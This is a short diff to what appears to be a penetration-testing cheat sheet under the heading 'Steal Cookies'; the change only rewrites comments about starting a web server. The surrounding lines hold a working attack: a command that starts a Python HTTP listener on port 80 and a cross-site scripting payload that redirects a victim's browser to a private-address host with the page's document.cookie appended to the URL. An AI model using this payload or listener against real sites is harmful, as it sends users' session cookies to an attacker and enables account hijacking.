@@ -1,7 +1,8 @@
 Steal Cookies
 -----------------------
 ```
-# Start Web Server
+# Use ruby SSL server for SSL connections
+# Start Python Web Server
 python -m SimpleHTTPServer 80
 
 <script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
